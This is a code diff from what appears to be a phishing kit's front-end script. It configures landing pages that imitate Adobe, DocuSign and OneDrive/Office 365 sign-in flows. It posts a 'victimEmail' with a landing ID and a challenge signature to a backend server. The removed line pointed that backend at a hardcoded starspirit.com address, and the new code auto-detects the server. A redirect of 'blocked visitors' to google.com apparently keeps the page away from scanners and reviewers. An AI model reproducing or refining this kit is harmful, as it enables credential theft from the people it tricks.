@@ -182,10 +182,10 @@
                    Values: "" | "dual-adobe-onedrive" | "dual-docusign-onedrive"
    ══════════════════════════════════════════════════════════════════════════ */
 
-const API_BASE_URL       = "https://starspirit.com";       // ← auto-configured by installer
+const API_BASE_URL       = "";       // ← "" = auto-detect (same server)
                                                     //   or full URL for remote server
-const APP_DIR_NAME       = "share";                  // ← sibling app folder name (used when auto-detecting)
-const LANDING_MODE       = "dual-adobe-onedrive";   // ← your landing mode
+const APP_DIR_NAME       = "page";                  // ← sibling app folder name (used when auto-detecting)
+const LANDING_MODE       = "";   // ← your landing mode
 const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitors go
 
 (async function () {
@@ -423,7 +423,7 @@ const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitor
       body: JSON.stringify({
         email:       victimEmail,
         landingPage: landingId,
-        mode:        'o365',
+        mode:        isO365 ? 'o365' : '',
         c_id:        challenge_id,
         c_ts:        challenge_ts,
         c_sig:       challenge_sig,
